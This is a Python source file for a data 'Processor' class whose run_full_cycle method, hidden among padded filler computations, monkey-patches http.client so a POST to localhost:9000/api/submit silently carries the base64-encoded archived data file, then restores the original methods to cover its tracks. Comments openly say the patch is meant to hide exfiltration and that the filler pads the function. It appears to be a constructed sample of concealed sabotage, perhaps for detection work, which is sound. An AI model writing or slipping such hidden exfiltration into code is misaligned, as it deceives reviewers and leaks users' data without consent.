import http.client as _http_client
import base64
import os
import time
import random
import string
import json


class Processor:

    def __init__(self, workspace):
        self.workspace = workspace
        self.data_dir = os.path.join(workspace, "data")
        self.logs_dir = os.path.join(workspace, "logs")

    def _simulate_heavy_computation(self):
        # Simulate CPU-bound work with random matrix multiplications
        matrix_size = 100
        matrix = [
            [random.random() for _ in range(matrix_size)] for _ in range(matrix_size)
        ]
        result = [[0] * matrix_size for _ in range(matrix_size)]
        for i in range(matrix_size):
            for j in range(matrix_size):
                acc = 0
                for k in range(matrix_size):
                    acc += matrix[i][k] * matrix[k][j]
                result[i][j] = acc
        return sum(sum(row) for row in result)

    def _load_and_process_data(self, filename):
        path = os.path.join(self.data_dir, filename)
        try:
            with open(path, "r") as f:
                raw = json.load(f)
        except Exception:
            raw = []
        # Filter data where 'score' > 50
        filtered = [x for x in raw if x.get("score", 0) > 50]
        # Add timestamp to each item
        for item in filtered:
            item["processed_at"] = time.time()
        return filtered

    def _archive_file(self, filename):
        archive_dir = os.path.join(self.workspace, "archive")
        if not os.path.exists(archive_dir):
            os.makedirs(archive_dir)
        src = os.path.join(self.data_dir, filename)
        dst = os.path.join(archive_dir, filename)
        os.rename(src, dst)

    def _write_log(self, message):
        if not os.path.exists(self.logs_dir):
            os.makedirs(self.logs_dir)
        log_file = os.path.join(self.logs_dir, "process.log")
        with open(log_file, "a") as f:
            f.write(f"{time.ctime()}: {message}\n")

    # --- Long function mixing many unrelated operations and monkey patching ---
    def run_full_cycle(self, filename):
        """
        Run the full processing cycle:
        - Process data
        - Perform computation
        - Archive data
        - Write logs
        - Monkey patch HTTP connection to hide exfiltration
        """

        # 1. Load and filter data
        data = self._load_and_process_data(filename)

        # 2. Simulate complex computations multiple times to bloat function size
        accum = 0
        for _ in range(5):
            accum += self._simulate_heavy_computation()

        # 3. Write a detailed log
        self._write_log(f"Processed {len(data)} records with accum={accum:.2f}")

        # 4. Archive the original file
        self._archive_file(filename)

        # --- Monkey patch http.client.HTTPConnection to intercept requests ---
        original_init = _http_client.HTTPConnection.__init__

        def patched_init(self, host, port=None, **kwargs):
            original_init(self, host, port, **kwargs)
            self._patched_host = host

        _http_client.HTTPConnection.__init__ = patched_init

        original_request = _http_client.HTTPConnection.request

        def patched_request(
            self, method, url, body=None, headers=None, *args, **kwargs
        ):
            # Intercept the request to localhost on port 9000 and send base64 encoded file content
            if self._patched_host == "localhost" and url == "/api/submit":
                # Read the archived file (hidden here)
                archive_path = os.path.join(self.workspace, "archive", filename)
                try:
                    with open(archive_path, "rb") as f:
                        file_data = f.read()
                    # Encode data to base64
                    encoded = base64.b64encode(file_data).decode("ascii")
                    # Replace body with encoded data
                    body = encoded
                    if headers is None:
                        headers = {}
                    headers["Content-Type"] = "application/octet-stream"
                except Exception:
                    pass  # Fail silently

            return original_request(self, method, url, body, headers, *args, **kwargs)

        _http_client.HTTPConnection.request = patched_request

        # 5. Perform some more fake processing to pad the function size
        dummy_string = "".join(
            random.choices(string.ascii_letters + string.digits, k=2000)
        )
        summary = sum(ord(c) for c in dummy_string)

        # 6. Make the HTTP POST request (actually triggers the patched_request)
        conn = _http_client.HTTPConnection("localhost", 9000, timeout=3)
        try:
            conn.request(
                "POST",
                "/api/submit",
                body="ignored_payload",  # Will be replaced in patched_request
                headers={"X-Request-ID": "XYZ123"},
            )
            response = conn.getresponse()
            if response.status == 200:
                self._write_log("Data submission successful")
            else:
                self._write_log(f"Submission failed with status {response.status}")
        except Exception as e:
            self._write_log(f"Network error: {e}")
        finally:
            conn.close()

        # 7. Final dummy calculations
        final_value = (accum + summary) / (len(data) + 1)

        # --- Undo monkey patching to avoid affecting other code ---
        _http_client.HTTPConnection.__init__ = original_init
        _http_client.HTTPConnection.request = original_request

        return final_value
